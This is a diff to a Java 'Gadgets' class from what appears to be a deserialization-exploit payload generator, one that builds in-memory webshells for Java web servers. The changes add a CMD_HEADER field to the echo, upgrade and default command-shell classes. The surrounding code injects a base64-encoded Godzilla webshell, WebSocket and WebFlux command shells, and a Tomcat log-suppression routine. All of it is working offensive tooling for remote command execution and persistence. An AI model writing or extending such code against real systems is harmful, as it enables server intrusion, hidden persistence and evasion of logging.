@@ -198,8 +198,8 @@ public class Gadgets {
 			if (className.endsWith("DefineClassFromParameter")) {
 				insertField(ctClass, "parameter", "public static String parameter = \"" + PARAMETER + "\";");
 			} else if (className.endsWith("Echo")) {
+				insertField(ctClass, "CMD_HEADER", "public static String CMD_HEADER = \"" + CMD_HEADER_STRING + "\";");
 				// 动态为 Echo回显类 添加执行命令功能
-
 				insertCMD(ctClass);
 				ctClass.getDeclaredMethod("q").setBody("{return execCmd($1);}");
 
@@ -432,7 +432,7 @@ public class Gadgets {
 			insertTomcatNoLog(ctClass);
 			insertMethod(ctClass, method, base64Decode(GODZILLA_RAW_SHELL).replace("https://su18.org/", REFERER));
 		} else if ("execute".equals(type)) {
-			ctClass.addField(CtField.make("public static String TAG = \"su18\";", ctClass));
+			insertField(ctClass, "TAG", "public static String TAG = \"su18\";");
 			insertCMD(ctClass);
 			ctClass.addMethod(CtMethod.make(base64Decode(GET_REQUEST), ctClass));
 			ctClass.addMethod(CtMethod.make(base64Decode(BASE64_ENCODE_BYTE_TO_STRING), ctClass));
@@ -443,11 +443,14 @@ public class Gadgets {
 			insertCMD(ctClass);
 			insertMethod(ctClass, method, base64Decode(WS_SHELL));
 		} else if ("upgrade".equals(type)) {
+			insertField(ctClass, "CMD_HEADER", "public static String CMD_HEADER = \"" + CMD_HEADER_STRING + "\";");
+
 			ctClass.addMethod(CtMethod.make(base64Decode(GET_FIELD_VALUE), ctClass));
 			insertCMD(ctClass);
 			insertMethod(ctClass, method, base64Decode(UPGRADE_SHELL));
 		} else {
 			insertCMD(ctClass);
+			insertField(ctClass, "CMD_HEADER", "public static String CMD_HEADER = \"" + CMD_HEADER_STRING + "\";");
 
 			if (isWebflux) {
 				insertMethod(ctClass, method, base64Decode(CMD_SHELL_FOR_WEBFLUX));
